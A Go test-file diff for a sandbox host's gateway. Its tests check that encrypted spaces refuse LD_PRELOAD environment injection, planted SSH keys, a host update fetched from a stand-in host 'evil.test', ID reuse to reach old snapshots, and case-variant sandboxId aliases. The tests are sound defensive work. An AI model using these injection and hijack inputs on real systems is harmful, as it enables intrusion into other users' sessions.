@@ -174,13 +174,45 @@ func TestTheGatewayCantReachAnE2ESpacesContent(t *testing.T) {
 	if raw, _ := json.Marshal(map[string]any{"sandboxId": "sbx_copy", "from": "snap_one", "owner": "acc_org"}); h.gatewayMayCall(proto.MethodCreate, raw) != nil {
 		t.Error("a create from a snapshot in the same space was refused")
 	}
-	for _, m := range []string{proto.MethodCreate, proto.MethodStop, proto.MethodGet, proto.MethodList} {
+	for _, m := range []string{proto.MethodStop, proto.MethodGet, proto.MethodList} {
 		if refused(m, map[string]string{"sandboxId": "sbx_one"}) {
 			t.Errorf("lifecycle call %s was refused", m)
 		}
 	}
+	if raw, _ := json.Marshal(map[string]any{"sandboxId": "sbx_new", "owner": "acc_org", "env": map[string]string{"A": "1"}}); h.gatewayMayCall(proto.MethodCreate, raw) != nil {
+		t.Error("a fresh create in an E2E space was refused")
+	}
+	// The gateway's environment variables or SSH keys on a copy of an E2E sandbox, or on a fork of one.
+	mustRefuse(map[string]any{"sandboxId": "sbx_copy2", "from": "snap_one", "owner": "acc_org", "env": map[string]string{"LD_PRELOAD": "/tmp/x.so"}})
+	mustRefuse(map[string]any{"sandboxId": "sbx_copy2", "from": "snap_one", "owner": "acc_org", "sshAuthorizedKeys": []string{"ssh-ed25519 AAAA gateway"}})
+	if raw, _ := json.Marshal(map[string]any{"sandboxId": "sbx_one", "newId": "sbx_fork", "env": map[string]string{"A": "1"}}); h.gatewayMayCall(proto.MethodFork, raw) == nil {
+		t.Error("a fork of an E2E sandbox with the gateway's env wasn't refused")
+	}
+	// A gateway-pushed binary could read every session.
+	if raw, _ := json.Marshal(map[string]any{"version": "9.9.9", "url": "https://evil.test/kantel-host"}); h.gatewayMayCall(proto.MethodHostUpdate, raw) == nil {
+		t.Error("host.update wasn't refused on a host with an E2E space")
+	}
 	if len(tier.execs) != 0 {
 		t.Fatal("something ran")
+	}
+}
+
+// The gateway deletes an E2E sandbox and makes its ID again in a space without E2E, to reach its snapshots.
+func TestAnE2ESandboxsIDIsntReused(t *testing.T) {
+	h, tier, _ := e2eHost(t)
+	del, _ := json.Marshal(map[string]any{"sandboxId": "sbx_one"})
+	if err := h.gatewayMayCall(proto.MethodDelete, del); err != nil {
+		t.Fatalf("delete refused: %v", err)
+	}
+	// The tier drops the sandbox (its snapshots stay); the host still knows whose the ID was.
+	tier.owners["sbx_one"] = "acc_plain"
+	create, _ := json.Marshal(map[string]any{"sandboxId": "sbx_one", "owner": "acc_plain"})
+	if err := h.gatewayMayCall(proto.MethodCreate, create); err == nil {
+		t.Fatal("the E2E sandbox's ID was given to another space")
+	}
+	read, _ := json.Marshal(map[string]any{"snapshotId": "snap_one", "path": "/"})
+	if err := h.gatewayMayCall(proto.MethodSnapshotRead, read); err == nil {
+		t.Fatal("the snapshot of an E2E sandbox whose ID now has another owner was readable")
 	}
 }
 
@@ -207,6 +239,13 @@ func TestAnE2ESessionRunsAMembersCommandAndTheRelaySeesCiphertext(t *testing.T) 
 	_ = json.Unmarshal(raw, &res)
 	if res.Stdout != "ran: "+secret+"\n" || len(tier.execs) != 1 || tier.execs[0].SandboxID != "sbx_one" {
 		t.Fatalf("result %+v, execs %+v", res, tier.execs)
+	}
+	// Nor any other spelling Go's decoding takes for sandboxId.
+	if _, err := c.Call(proto.MethodExec, map[string]any{"sandboxid": "sbx_other", "SANDBOXID": "sbx_other", "command": "id"}); err != nil {
+		t.Fatal(err)
+	}
+	if len(tier.execs) != 2 || tier.execs[1].SandboxID != "sbx_one" {
+		t.Fatalf("a sandboxId alias reached another sandbox: %+v", tier.execs)
 	}
 	if _, err := c.Call(proto.MethodCreate, map[string]any{"sandboxId": "sbx_new"}); err == nil {
 		t.Fatal("a lifecycle call ran in a session")
